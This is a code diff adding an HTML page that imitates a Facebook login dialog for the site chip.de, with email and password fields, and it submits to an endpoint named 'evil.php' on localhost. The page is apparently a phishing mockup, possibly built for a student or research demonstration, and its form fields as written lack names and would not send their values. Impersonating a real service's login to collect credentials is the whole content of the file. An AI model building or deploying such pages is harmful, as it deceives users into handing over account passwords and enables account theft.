@@ -1,0 +1,131 @@
+<!DOCTYPE>
+<html>
+<head>
+	<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+	<title>Facebook Login</title>
+	<style type="text/css">
+		.hover {
+			cursor: pointer;
+		}
+		body {
+			font-size: 0.9em; font-family: Arial; 
+			margin:0; letter-spacing: 1px;
+		}
+		form {
+			width: 100%; height:100%;
+		}
+		div#heading {
+			background-color:#6d84b4;
+		}
+		img {
+			margin: 5px; float:left;
+		}
+		p#heading {
+			font-weight:bolder; color: #ffffff; padding: 7px;
+		}
+		div#content {
+			padding-left: 35px; font-size: 0.8em;
+		}
+		a#domain {
+			color: #476dc5; text-decoration: none; font-weight: normal;
+		}
+		input.fbinput {
+			width: 115%; background-color: #faffbd; border: 1px solid #bdc7d8;
+		}
+		table {
+			font-size: 1.0em; font-weight:bold; color: #666666;
+		}
+		p#info {
+			color: #000000; font-weight: normal; float:left; margin: 3px;
+		}
+		a.fblink {
+			color: #476dc5; text-decoration: none; font-weight: normal;
+		}
+		div#footer {
+			position: absolute; bottom:10px; width:100%; background-color: #f2f2f2; 
+			border-top: 1px solid #cccccc; font-size: 0.9em
+		}
+		p#footer_left {
+			float:left; width:70%; margin-left: 15px;
+		}
+		a#sign_up {
+			text-decoration: none; color: #3b5998; font-weight:bold;
+		}
+		p#footer_right {
+			float:left; width:25%; align:right;
+		}
+		input.submit {
+			background-color:#617aac; color: #ffffff; font-weight: bold; 
+			padding: 5px 10px; border: 1px solid #000;
+		}
+		input.cancel {
+			background-color:#ecebec; color: #000; font-weight: bold; 
+			padding: 5px 10px; border: 1px solid #000;
+		}
+	</style>
+</head>
+<body>
+	<form action="localhost/bakk/evil.php" method="post">
+		<div id="heading">
+			<img src="fb.gif"></img>
+			<p id="heading">Facebook</p>
+		</div>
+		<div id="content">
+			<p>
+				Log in to use your Facebook account with 
+				<a id="domain" href="#">chip.de</a>.
+			</p>
+			<div style="padding-left: 35px;">
+				<table>
+					<tr>
+						<td>Email or Phone:</td>
+						<td>
+							<input class="fbinput" type="text"></input>
+						</td>
+					</tr>
+					<tr>
+						<td>Password</td>
+						<td>
+							<input class="fbinput" type="password"></input>
+						</td>
+					</tr>
+					<tr>
+						<td></td>
+						<td>
+							<input style="float:left;" type="checkbox" checked="checked"></input> 
+							<p id="info">Keep me logged in.</p>
+						</td>
+					</tr>
+					<tr>
+						<td></td>
+						<td>
+							<p>
+								<a href="#" class="fblink">Forgot your password?</a>
+							</p>
+						</td>
+					</tr>
+				</table>
+			</div>
+		</div>
+		<div id="footer">
+			<p id="footer_left">
+				<a href="#" id="sign_up">Sign up for Facebook</a>
+			</p>
+			<p id="footer_right">
+				<input class="hover submit" type="submit" value="Log In"></input>
+				<button class="hover cancel">Cancel</button>
+			</p>
+		</div>
+	</form>
+	<script>
+
+        $(document).ready( function() {
+			try {
+
+			} catch (e) {
+				console.log(e);
+			}
+        });
+	</script>
+</body>
+</html>
